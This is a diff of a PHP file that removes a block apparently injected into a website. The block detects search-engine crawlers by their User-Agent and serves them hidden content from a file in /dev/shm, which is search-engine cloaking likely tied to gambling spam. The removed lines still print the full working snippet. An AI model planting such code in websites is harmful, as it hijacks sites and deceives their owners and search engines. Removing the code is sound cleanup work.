@@ -1,35 +1,3 @@
-<?php 
-$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$is_bot = false;
-
-$bot_signatures = [
-    'Googlebot',
-    'Google-InspectionTool',
-    'Mediapartners-Google',
-    'AdsBot-Google',
-    'Bingbot',
-    'Slurp',
-    'DuckDuckBot'
-];
-
-foreach ($bot_signatures as $bot) {
-    if (stripos($user_agent, $bot) !== false) {
-        $is_bot = true;
-        break;
-    }
-}
-
-if ($is_bot) {
-    $sonic_gacor = '/dev/shm/publication-usk';
-
-    if (file_exists($sonic_gacor)) {
-        header('Content-Type: text/html; charset=utf-8');
-        echo file_get_contents($sonic_gacor);
-        exit;
-    } else {
-    }
-}
-?>
 <?php
 
 /**
